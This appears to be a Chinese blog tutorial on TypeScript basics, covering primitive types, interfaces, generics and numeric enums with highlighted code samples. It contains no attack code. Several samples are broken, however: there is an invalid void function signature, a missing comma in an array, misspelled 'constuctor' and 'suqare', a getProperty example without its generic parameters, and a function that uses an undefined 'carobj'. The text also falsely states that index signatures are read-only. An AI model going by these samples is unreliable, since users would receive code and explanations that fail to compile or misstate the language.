+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ts-node index.ts</span><br></pre></td></tr></table></figure>
+
+<h5 id="1、基础类型"><a href="#1、基础类型" class="headerlink" title="1、基础类型"></a>1、基础类型</h5><h6 id="数值"><a href="#数值" class="headerlink" title="数值"></a>数值</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> num: number = <span class="number">10</span>;</span><br></pre></td></tr></table></figure>
+
+<h6 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str: string = <span class="string">&#x27;123&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h6 id="布尔值"><a href="#布尔值" class="headerlink" title="布尔值"></a>布尔值</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> isFlag: boolean = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
+
+<h6 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h6><p>第一种方式</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> strArr: string[] = [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>];</span><br><span class="line"><span class="keyword">let</span> numArr: number[] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br></pre></td></tr></table></figure>
+
+<p>第二种方式，使用数组泛型<code>Array&lt;元素类型&gt;</code></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> boolArr: <span class="built_in">Array</span>&lt;boolean&gt; = [<span class="literal">true</span>,<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">false</span>];</span><br></pre></td></tr></table></figure>
+
+<h6 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h6><p>限定数组个数和类型</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> tuple: [string,number,boolean] = [<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>,<span class="literal">true</span>];</span><br></pre></td></tr></table></figure>
+
+<h6 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h6><p>使用枚举<code>enum</code>类型可以为衣组数值赋予有好的语义</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">enum Color &#123;</span><br><span class="line">    Red,</span><br><span class="line">    Green,</span><br><span class="line">    Blue</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> color:Color = Color.Blue;</span><br></pre></td></tr></table></figure>
+
+<p>转换成js如下：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> Color;</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">Color</span>) </span>&#123;</span><br><span class="line">    Color[Color[<span class="string">&quot;Red&quot;</span>] = <span class="number">0</span>] = <span class="string">&quot;Red&quot;</span>;</span><br><span class="line">    Color[Color[<span class="string">&quot;Green&quot;</span>] = <span class="number">1</span>] = <span class="string">&quot;Green&quot;</span>;</span><br><span class="line">    Color[Color[<span class="string">&quot;Blue&quot;</span>] = <span class="number">2</span>] = <span class="string">&quot;Blue&quot;</span>;</span><br><span class="line">&#125;)(Color || (Color = &#123;&#125;));</span><br><span class="line"><span class="keyword">let</span> color = Color.Blue;</span><br></pre></td></tr></table></figure>
+
+<p>默认枚举值是从0开始，然后枚举值和名称是可以相互索引得到。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Color.red=<span class="number">0</span>;</span><br><span class="line">Color[<span class="number">0</span>]=<span class="string">&#x27;red&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>枚举值默认从0开始，如果你不想从0开始，可以自己进行设置</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">enum Color &#123;</span><br><span class="line">    Red = <span class="number">1</span>,</span><br><span class="line">    Green,</span><br><span class="line">    Blue</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也可以手动设置所有枚举值</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">enum Color &#123;</span><br><span class="line">    Red = <span class="number">2</span>,</span><br><span class="line">    Green = <span class="number">5</span>,</span><br><span class="line">    Blue = <span class="number">10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="Any"><a href="#Any" class="headerlink" title="Any"></a>Any</h6><p>在遇到一些不确定类型的时候，可以使用<code>any</code>类型来标记</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> notSure: any = [<span class="number">1</span>,<span class="number">2</span><span class="string">&#x27;232&#x27;</span>,<span class="literal">true</span>];</span><br></pre></td></tr></table></figure>
+
+<h6 id="Void"><a href="#Void" class="headerlink" title="Void"></a>Void</h6><p><code>void</code>表示没有任何类型，当一个函数没有返回值时，可以声明其返回值为<code>void</code></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showMessage</span>: <span class="title">void</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;this is some message&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="Null和Undefined"><a href="#Null和Undefined" class="headerlink" title="Null和Undefined"></a>Null和Undefined</h6><p><code>null</code>和<code>undefined</code>本身的类型用处不大</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> n: <span class="literal">null</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">let</span> u: <span class="literal">undefined</span> = <span class="literal">undefined</span>;</span><br></pre></td></tr></table></figure>
+
+<h6 id="Never"><a href="#Never" class="headerlink" title="Never"></a>Never</h6><p><code>Never</code>类型表示的是那些永不存在值的类型，存在永不可能到达的终点，例如抛出异常和死循环等。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">errLog</span>(<span class="params">message: string</span>): <span class="title">never</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(message);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;test&#x27;</span>);	<span class="comment">//这句代码永远不可能执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showSomething</span>(<span class="params"></span>): <span class="title">never</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;test&#x27;</span>);	<span class="comment">//这句代码永远不可能执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h6><p><code>object</code>表示非原始类型，就是除了<code>number</code>,<code>string</code>,<code>boolean</code>,<code>symbol</code>,<code>null</code>或<code>undefined</code>之外的类型。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create</span>(<span class="params">o: object</span>): <span class="title">void</span> </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(o.msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">create(&#123;<span class="attr">msg</span>:<span class="string">&#x27;type object&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+<h5 id="2、接口"><a href="#2、接口" class="headerlink" title="2、接口"></a>2、接口</h5><blockquote>
+<p>TypeScript的核心原则之一是对值所具有的<em>结构</em>进行类型检查。 它有时被称做“鸭式辨型法”或“结构性子类型化”。 在TypeScript里，接口的作用就是为这些类型命名和为你的代码或第三方代码定义契约。</p>
+</blockquote>
+<h6 id="基础用法"><a href="#基础用法" class="headerlink" title="基础用法"></a>基础用法</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Car &#123;</span><br><span class="line">    brand: string,</span><br><span class="line">    price: number</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showCarInfo</span>(<span class="params">carobj: Car</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`车的牌子是：<span class="subst">$&#123;carobj.brand&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`车的价格是：<span class="subst">$&#123;carobj.price&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">brand</span>: <span class="string">&#x27;大众&#x27;</span>, <span class="attr">price</span>: <span class="number">10</span>&#125;;</span><br><span class="line">showCarInfo(obj);</span><br></pre></td></tr></table></figure>
+
+<p>上面的代码规定了传进来的参数要按照接口<code>Car</code>的类型，必须存在一个<code>brand</code>属性和一个<code>price</code>属性</p>
+<h6 id="可选属性"><a href="#可选属性" class="headerlink" title="可选属性"></a>可选属性</h6><p>如果有些属性是可传可不传的话，可以使用<code>?</code>来标记为可选属性</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Car &#123;</span><br><span class="line">    brand: string,</span><br><span class="line">    price?: number</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showCarInfo</span>(<span class="params">carobj: Car</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`车的牌子是：<span class="subst">$&#123;carobj.brand&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">if</span>(carobj.price)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`车的价格是：<span class="subst">$&#123;carobj.price&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">brand</span>: <span class="string">&#x27;大众&#x27;</span>, <span class="attr">price</span>: <span class="number">10</span>&#125;;</span><br><span class="line">showCarInfo(obj);  </span><br></pre></td></tr></table></figure>
+
+<h6 id="只读属性"><a href="#只读属性" class="headerlink" title="只读属性"></a>只读属性</h6><p>一些对象属性只能在对象刚刚创建的时候修改其值，可以在属性名前面使用<code>readonly</code>来指定其为只读属性</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Car &#123;</span><br><span class="line">    readonly brand: string,</span><br><span class="line">    readonly price: number</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> car1: Car = &#123; <span class="attr">brand</span>: <span class="string">&#x27;大众&#x27;</span>, <span class="attr">price</span>: <span class="number">10</span>&#125;;</span><br><span class="line">car1.brand = <span class="string">&#x27;思域&#x27;</span>; <span class="comment">//报错</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="字符串索引签名"><a href="#字符串索引签名" class="headerlink" title="字符串索引签名"></a>字符串索引签名</h6><p>如果传进来的数据里面存在额外未声明的属性，也会存在问题，如果想让其绕过检查，则需要为接口添加索引签名</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Car &#123;</span><br><span class="line">    brand: string,</span><br><span class="line">    price: number</span><br><span class="line">    [propName: string]: any</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showCarInfo</span>(<span class="params">carobj: Car</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`车的牌子是：<span class="subst">$&#123;carobj.brand&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`车的价格是：<span class="subst">$&#123;carobj.price&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">brand</span>: <span class="string">&#x27;大众&#x27;</span>, <span class="attr">price</span>: <span class="number">10</span>, <span class="attr">testa</span>: <span class="number">1</span>, <span class="attr">testb</span>:<span class="string">&#x27;12&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">showCarInfo(obj);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h6 id="索引签名"><a href="#索引签名" class="headerlink" title="索引签名"></a>索引签名</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface CarArr &#123;</span><br><span class="line">  [index: number]: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> myArray: CarArr</span><br><span class="line"></span><br><span class="line">myArray = [<span class="string">&quot;奥迪&quot;</span>, <span class="string">&quot;大众&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> myStr: string = myArray[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
+
+<p>索引签名是只读的</p>
+<h6 id="函数类型"><a href="#函数类型" class="headerlink" title="函数类型"></a>函数类型</h6><p>使用接口表示函数类型</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface CarFunc &#123;</span><br><span class="line">    (brand: string, <span class="attr">price</span>: number): <span class="keyword">void</span></span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">let</span> showCarInfo: CarFunc;</span><br><span class="line">showCarInfo = <span class="function"><span class="keyword">function</span>(<span class="params">brand: string,price: number</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`车的牌子是：<span class="subst">$&#123;carobj.brand&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`车的价格是：<span class="subst">$&#123;carobj.price&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="类类型"><a href="#类类型" class="headerlink" title="类类型"></a>类类型</h6><p>使用接口强制一个类去符合相应的规则</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface ClockInterface &#123;</span><br><span class="line">    currentTime: <span class="built_in">Date</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Clock</span> <span class="title">implements</span> <span class="title">ClockInterface</span> </span>&#123;</span><br><span class="line">    currentTime: <span class="built_in">Date</span>;</span><br><span class="line">	constuctor(h: number, <span class="attr">m</span>: number)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也可以在接口中描述一个方法，在类里面实现它</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface ClockInterface &#123;</span><br><span class="line">    currentTime: <span class="built_in">Date</span>;</span><br><span class="line">    setTime(d: <span class="built_in">Date</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Clock</span> <span class="title">implements</span> <span class="title">ClockInterface</span> </span>&#123;</span><br><span class="line">    currentTime: <span class="built_in">Date</span>;</span><br><span class="line">    setTime(d: <span class="built_in">Date</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.currentTime = d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">constructor</span>(h: number, m: number) &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="接口继承"><a href="#接口继承" class="headerlink" title="接口继承"></a>接口继承</h6><p>和类一样，接口也是可以相互继承的，我们能够从一个接口复制成员到另外一个接口，可以更灵活地将接口分割到可重用的模块里</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Shape &#123;</span><br><span class="line">    color: string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Square <span class="keyword">extends</span> Shape &#123;</span><br><span class="line">    sideLength: number</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> square = <span class="xml"><span class="tag">&lt;<span class="name">Square</span>&gt;</span>&#123;&#125;;</span></span><br><span class="line"><span class="xml">square.color = &#x27;blue&#x27;;</span></span><br><span class="line"><span class="xml">suqare.sideLength = 10;</span></span><br></pre></td></tr></table></figure>
+
+<p>一个接口可以继承多个接口</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Shape &#123;</span><br><span class="line">    color: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface PenStroke &#123;</span><br><span class="line">    penWidth: number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Square <span class="keyword">extends</span> Shape, PenStroke &#123;</span><br><span class="line">    sideLength: number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> square = <span class="xml"><span class="tag">&lt;<span class="name">Square</span>&gt;</span>&#123;&#125;;</span></span><br><span class="line"><span class="xml">square.color = &quot;blue&quot;;</span></span><br><span class="line"><span class="xml">square.sideLength = 10;</span></span><br><span class="line"><span class="xml">square.penWidth = 5.0;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="混合类型"><a href="#混合类型" class="headerlink" title="混合类型"></a>混合类型</h6><p>如果一个对象可以同时做为函数和对象使用，使用接口可以如下进行定义</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Counter &#123;</span><br><span class="line">    (start: number): string;</span><br><span class="line">    interval: number;</span><br><span class="line">    reset(): <span class="keyword">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCounter</span>(<span class="params"></span>): <span class="title">Counter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> counter = <span class="xml"><span class="tag">&lt;<span class="name">Counter</span>&gt;</span>function (start: number) &#123; &#125;;</span></span><br><span class="line"><span class="xml">    counter.interval = 123;</span></span><br><span class="line"><span class="xml">    counter.reset = function () &#123; &#125;;</span></span><br><span class="line"><span class="xml">    return counter;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">let c = getCounter();</span></span><br><span class="line"><span class="xml">c(10);</span></span><br><span class="line"><span class="xml">c.reset();</span></span><br><span class="line"><span class="xml">c.interval = 5.0;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="接口继承类"><a href="#接口继承类" class="headerlink" title="接口继承类"></a>接口继承类</h6><blockquote>
+<p>当接口继承了一个类类型时，它会继承类的成员但不包括其实现。 就好像接口声明了所有类中存在的成员，但并没有提供具体实现一样。 接口同样会继承到类的private和protected成员。 这意味着当你创建了一个接口继承了一个拥有私有或受保护的成员的类时，这个接口类型只能被这个类或其子类所实现（implement）</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Control</span> </span>&#123;</span><br><span class="line">    private state: any;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface SelectableControl <span class="keyword">extends</span> Control &#123;</span><br><span class="line">    select(): <span class="keyword">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Button</span> <span class="keyword">extends</span> <span class="title">Control</span> <span class="title">implements</span> <span class="title">SelectableControl</span> </span>&#123;</span><br><span class="line">    select() &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TextBox</span> <span class="keyword">extends</span> <span class="title">Control</span> </span>&#123;</span><br><span class="line">    select() &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误：“Image”类型缺少“state”属性。</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Image</span> <span class="title">implements</span> <span class="title">SelectableControl</span> </span>&#123;</span><br><span class="line">    select() &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Location</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面代码中，<code>SelectableControl</code>包含了<code>Control</code>的所有成员，包括其私有成员<code>state</code>，因为<code>state</code>是私有成员，所以只能够是<code>Control</code>的子类们才能实现<code>SelectabControl</code>接口，因为只有<code>Control</code>的子类才能够拥有一个声明于<code>Control</code>的私有成员<code>state</code>，这对私有成员的兼容性是必需的。</p>
+<p>在<code>Control</code>类内部，是允许通过<code>SelectableControl</code>的实例来访问私有成员<code>state</code>的。 实际上， <code>SelectableControl</code>接口和拥有<code>select</code>方法的<code>Control</code>类是一样的。 <code>Button</code>和<code>TextBox</code>类是<code>SelectableControl</code>的子类（因为它们都继承自<code>Control</code>并有<code>select</code>方法），但<code>Image</code>和<code>Location</code>类并不是这样的。</p>
+<h5 id="3、泛型"><a href="#3、泛型" class="headerlink" title="3、泛型"></a>3、泛型</h5><p>使用<code>泛型</code>来创建可重用的组件，一个组件可以支持多种类型的数据，这样用户就可以以自己的数据类型来使用组件</p>
+<p>例如：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getResult</span>&lt;<span class="title">T</span>&gt;(<span class="params">arg1: T, arg2: T</span>):<span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg1 + arg2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(getResult&lt;string&gt;(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>));	<span class="comment">// &#x27;12&#x27;</span></span><br><span class="line"><span class="built_in">console</span>.log(getResult&lt;number&gt;(<span class="number">1</span>,<span class="number">2</span>));	<span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface GenericIdentityFn &#123;</span><br><span class="line">    &lt;T&gt;(arg: T): T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">identity</span>&lt;<span class="title">T</span>&gt;(<span class="params">arg: T</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> myIdentity: GenericIdentityFn = identity;</span><br></pre></td></tr></table></figure>
+
+<h6 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenericNumber</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    zeroValue: T;</span><br><span class="line">    add: <span class="function">(<span class="params">x: T, y: T</span>) =&gt;</span> T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> myGenericNumber = <span class="keyword">new</span> GenericNumber&lt;number&gt;();</span><br><span class="line">myGenericNumber.zeroValue = <span class="number">0</span>;</span><br><span class="line">myGenericNumber.add = <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123; <span class="keyword">return</span> x + y; &#125;;</span><br></pre></td></tr></table></figure>
+
+<p>注意：类有两部分：静态部分和实例部分。 泛型类指的是实例部分的类型，所以类的静态属性不能使用这个泛型类型</p>
+<h6 id="泛型约束"><a href="#泛型约束" class="headerlink" title="泛型约束"></a>泛型约束</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface Lengthwise &#123;</span><br><span class="line">    length: number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loggingIdentity</span>&lt;<span class="title">T</span> <span class="title">extends</span> <span class="title">Lengthwise</span>&gt;(<span class="params">arg: T</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(arg.length);  <span class="comment">// Now we know it has a .length property, so no more error</span></span><br><span class="line">    <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">loggingIdentity(<span class="number">3</span>);  <span class="comment">// Error, number doesn&#x27;t have a .length property</span></span><br><span class="line">loggingIdentity(&#123;<span class="attr">length</span>: <span class="number">10</span>, <span class="attr">value</span>: <span class="number">3</span>&#125;);</span><br></pre></td></tr></table></figure>
+
+<h6 id="在泛型约束中使用类型参数"><a href="#在泛型约束中使用类型参数" class="headerlink" title="在泛型约束中使用类型参数"></a>在泛型约束中使用类型参数</h6><p>你可以声明一个类型参数，且它被另一个类型参数所约束。 比如，现在想要用属性名从对象里获取这个属性。 并且想要确保这个属性存在于对象 <code>obj</code>上，因此需要在这两个类型之间使用约束</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getProperty</span>(<span class="params">obj: T, key: K</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> obj[key];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> x = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>, <span class="attr">c</span>: <span class="number">3</span>, <span class="attr">d</span>: <span class="number">4</span> &#125;;</span><br><span class="line"></span><br><span class="line">getProperty(x, <span class="string">&quot;a&quot;</span>); <span class="comment">// okay</span></span><br><span class="line">getProperty(x, <span class="string">&quot;m&quot;</span>); <span class="comment">// error: Argument of type &#x27;m&#x27; isn&#x27;t assignable to &#x27;a&#x27; | &#x27;b&#x27; | &#x27;c&#x27; | &#x27;d&#x27;.</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="在泛型里使用类类型"><a href="#在泛型里使用类类型" class="headerlink" title="在泛型里使用类类型"></a>在泛型里使用类类型</h6><p>在TypeScript使用泛型创建工厂函数时，需要引用构造函数的类类型。比如，</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create</span>&lt;<span class="title">T</span>&gt;(<span class="params">c: &#123;new(): T; &#125;</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> c();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用原型属性推断并约束构造函数与类实例的关系</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BeeKeeper</span> </span>&#123;</span><br><span class="line">    hasMask: boolean;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZooKeeper</span> </span>&#123;</span><br><span class="line">    nametag: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    numLegs: number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bee</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    keeper: BeeKeeper;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lion</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    keeper: ZooKeeper;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createInstance</span>&lt;<span class="title">A</span> <span class="title">extends</span> <span class="title">Animal</span>&gt;(<span class="params">c: new () =&gt; A</span>): <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> c();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">createInstance(Lion).keeper.nametag;  <span class="comment">// typechecks!</span></span><br><span class="line">createInstance(Bee).keeper.hasMask;   <span class="comment">// typechecks!</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="4、枚举"><a href="#4、枚举" class="headerlink" title="4、枚举"></a>4、枚举</h5><p>使用枚举可以定义一些语义化的常量，清晰的表达意图。</p>
+<h6 id="数字枚举"><a href="#数字枚举" class="headerlink" title="数字枚举"></a>数字枚举</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">enum Direction &#123;</span><br><span class="line">    Up = <span class="number">1</span>,</span><br><span class="line">    Down,</span><br><span class="line">    Left,</span><br><span class="line">    Right</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(Direction.Up)	<span class="comment">// 1</span></span><br><span class="line"><span class="built_in">console</span>.log(Direction.Down)	<span class="comment">// 2</span></span><br><span class="line"><span class="built_in">console</span>.log(Direction.Left)	<span class="comment">// 3</span></span><br><span class="line"><span class="built_in">console</span>.log(Direction.Right)	<span class="comment">// 4</span></span><br></pre></td></tr></table></figure>
+
+<p><code>Up</code>初始化为<code>1</code>，其余的成员就会从<code>1</code>开始自动增长。</p>
+<p>如果不手动初始化，则枚举值默认从<code>0</code>开始。</p>
